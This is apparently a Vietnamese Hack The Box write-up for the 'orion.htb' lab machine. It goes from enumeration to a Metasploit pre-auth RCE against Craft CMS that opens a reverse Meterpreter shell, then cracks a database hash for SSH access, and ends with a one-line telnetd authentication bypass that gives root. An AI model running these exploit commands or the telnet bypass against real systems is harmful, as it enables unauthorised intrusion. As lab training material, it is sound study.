![[Pasted image 20261014125922.png]]


# Véc tơ tấn công

- www-data: Nmap -> web -> phát hiện craftcms -> CVE-2025-32432 -> www-data shell
- adam: env -> root database password -> Database enumearation -> adam password bcrypt hash -> hashcat -> adam credentials for ssh -> shell
- root: system enumeration -> root nghe cổng 23 telnet -> telnet version 2.7 -> CVE-2026-24061 daemon bypass authentication -> shell
# Enumeration with Nmap

![[Pasted image 20261013233725.png]]

- Cổng 22 chạy SSH service -> không có gì đáng quan tâm lắm

- Cổng 80 đang chạy web server nginx và có tên miền DNS orion.htb

![[Pasted image 20261013234119.png]]




# Web Enumeration


web
![[Pasted image 20261013234210.png]]



feroxbuster
![[Pasted image 20261013234428.png]]


Tôi đã tìm thấy trang admin/login và phát hiện ra phiên bản Craft CMS 5.6.16


Sau khi tìm kiếm trên mạng thì phiên bản này bị dính lỗ hổng CVE-2025-32432 là 1 lỗ hổng pre-auth RCE -> chúng ta sẽ có shell


# Foothold as www-data

- Vì meterpreter của tôi chết liên tục nên tôi sẽ dùng write-up chính thức của HTB

```
$ msfconsole msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432 msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rhosts orion.htb msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rport 80 msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set lhost {YOURIPADDRESS} msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit [*] Started reverse TCP handler on 10.10.14.49:4444 [*] Running automatic check ("set AutoCheck false" to disable) [+] Leaked session.save_path: /var/lib/php/sessions [+] The target is vulnerable. Session path leaked [*] Injecting stub & triggering payload... [*] Sending stage (42137 bytes) to 10.129.231.23 [*] Meterpreter session 1 opened (10.10.14.49:4444 -> 10.129.231.23:57602) at 2026-03-12 14:19:18 +0200 meterpreter > getuid Server username: www-data
```

- Bằng cách sử dụng metasploit tôi đã có thể gain được 1 shell từ www-data

Trong lúc enumerate hệ thống thì tôi thấy environment variable chứa database credential của root

```
www-data@orion:~/html/craft$ cat .env CRAFT_DB_DRIVER=mysql CRAFT_DB_SERVER=127.0.0.1 CRAFT_DB_PORT=3306 CRAFT_DB_DATABASE=orion CRAFT_DB_USER=root CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```


Đăng nhập vào mysql và thực hiện database enumeration thì tôi đã nhìn thấy được username adam với mật khẩu bị mã hóa bcrypt 

```
$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```



=> chúng ta có credential adam:darkangel





# Foothold as adam


Khi bạn thử reuse credential và đăng nhập ssh bạn sẽ có được shell của adaam

![[Pasted image 20261014111720.png]]


- Thực hiện enumeration hệ thống thì tôi thấy root đang listen localhost ở cổng 23 (telnet) 
- Check telnet version thì tôi thấy thêm 1 thông tin là đang chạy ở version 2.7


![[Pasted image 20261014112031.png]]


=> telnet đang bị lỗ hổng CVE-2026-24061


# foothold as root

![[Pasted image 20261014112307.png]]


bằng cách sử dụng câu lệnh

```
USER="-f root" telnet -a 127.0.0.1
```


chúng ta có thể đánh lừa được daemon telnetd và bypass authentication của root => chúng ta kết nối telnet được với root => có được shell của root.


https://labs.hackthebox.com/achievement/machine/2406782/945
\